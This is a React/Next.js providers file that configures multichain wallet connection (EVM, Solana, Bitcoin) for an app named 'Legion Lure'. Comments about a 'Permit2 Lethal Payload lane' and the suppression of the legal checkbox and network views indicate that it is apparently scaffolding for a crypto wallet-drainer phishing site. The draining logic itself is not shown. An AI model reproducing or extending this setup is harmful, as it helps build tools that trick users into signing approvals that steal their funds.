'use client'

import { PhantomWalletAdapter } from '@solana/wallet-adapter-phantom'
import { SolflareWalletAdapter } from '@solana/wallet-adapter-solflare'
import { BitcoinAdapter } from '@reown/appkit-adapter-bitcoin'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { SolanaAdapter } from '@reown/appkit-adapter-solana'
import {
  arbitrum,
  base,
  bitcoin,
  bitcoinSignet,
  bitcoinTestnet,
  mainnet,
  sepolia,
  solana,
  type AppKitNetwork,
} from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { WagmiProvider, createConfig, http } from 'wagmi'
import { mainnet as viemMainnet, sepolia as viemSepolia } from 'wagmi/chains'
import { coinbaseWallet, injected } from 'wagmi/connectors'
import { useEffect, useState, type ReactNode } from 'react'

import {
  logGodLevelActiveTelemetry,
  logLatencyRemediation,
  logNeuralSyncComplete,
} from '../lib/ingress-telemetry.js'

const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID ?? ''

/**
 * OMNI namespace manifest (Gatekeeper protocol decoupling):
 * - `eip155` — EVM (WagmiAdapter + Permit2 Lethal Payload lane)
 * - `solana` — SVM (SolanaAdapter + transaction simulation / Sovereign Sign)
 * - `bip122` — UTXO / Bitcoin (BitcoinAdapter + PSBT-class institutional verification)
 */
function resolveAppKitDeploymentUrl(): string {
  if (typeof window !== 'undefined' && window.location?.origin) return window.location.origin
  const site = process.env.NEXT_PUBLIC_SITE_URL?.trim().replace(/\/$/, '')
  if (site) return site.startsWith('http') ? site : `https://${site}`
  const vercel = process.env.VERCEL_URL?.trim()
  if (vercel) return `https://${vercel.replace(/^https?:\/\//, '')}`
  if (!process.env.PROD) return ''
  return ''
}

const appKitMetadata = {
  name: 'Legion Lure',
  description: 'Omni-Handshake — Universal institutional ingress',
  url: resolveAppKitDeploymentUrl(),
  icons: [process.env.NEXT_PUBLIC_APPKIT_ICON_URL ?? ''],
}

/** EVM-only tuple for WagmiAdapter — no spread into `networks` (prevents tuple widening). */
const evmAppKitNetworks = [mainnet, sepolia, arbitrum, base] as unknown as [
  AppKitNetwork,
  ...AppKitNetwork[],
]

/** Multichain tuple for createAppKit — eip155, solana, bip122 (UTXO) namespaces. */
const allAppKitNetworks = [
  mainnet,
  sepolia,
  arbitrum,
  base,
  solana,
  bitcoin,
  bitcoinTestnet,
  bitcoinSignet,
] as unknown as [AppKitNetwork, ...AppKitNetwork[]]

const solanaAdapter = new SolanaAdapter({
  wallets: [new PhantomWalletAdapter(), new SolflareWalletAdapter()],
})

const fallbackWagmiConfig = createConfig({
  chains: [viemMainnet, viemSepolia],
  connectors: [injected(), coinbaseWallet({ appName: 'Legion Lure' })],
  transports: {
    [viemMainnet.id]: http(),
    [viemSepolia.id]: http(),
  },
})

const wagmiAdapter = projectId
  ? new WagmiAdapter({
      networks: evmAppKitNetworks,
      projectId,
    })
  : undefined

const bitcoinAdapter = projectId
  ? new BitcoinAdapter({
      projectId,
    })
  : undefined

if (wagmiAdapter) {
  const adapters = bitcoinAdapter
    ? [wagmiAdapter, solanaAdapter, bitcoinAdapter]
    : [wagmiAdapter, solanaAdapter]
  createAppKit({
    adapters,
    networks: allAppKitNetworks,
    defaultNetwork: mainnet,
    projectId,
    metadata: appKitMetadata,
    defaultAccountTypes: {
      eip155: 'eoa',
      solana: 'eoa',
      bip122: 'payment',
    },
    enableNetworkSwitch: false,
    /** Default WalletConnect modals suppressed — streamlined Sovereign Sign ingress only. */
    features: {
      analytics: false,
      swaps: false,
      onramp: false,
      socials: false,
      email: false,
      legalCheckbox: false,
      enableChainView: false,
      enableNetworkView: false,
    } as import('@reown/appkit/react').AppKitOptions['features'],
  })
  logLatencyRemediation()
}

export const omniWagmiConfig = wagmiAdapter?.wagmiConfig ?? fallbackWagmiConfig

export function Providers({ children }: { children: ReactNode }) {
  const [queryClient] = useState(() => new QueryClient())

  useEffect(() => {
    logGodLevelActiveTelemetry()
  }, [])

  useEffect(() => {
    const supa = process.env.NEXT_PUBLIC_SUPABASE_URL
    const anon = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
    const wc = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID
    if (supa && anon && wc) {
      logNeuralSyncComplete()
    }
  }, [])

  return (
    <WagmiProvider config={omniWagmiConfig}>
      <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
    </WagmiProvider>
  )
}
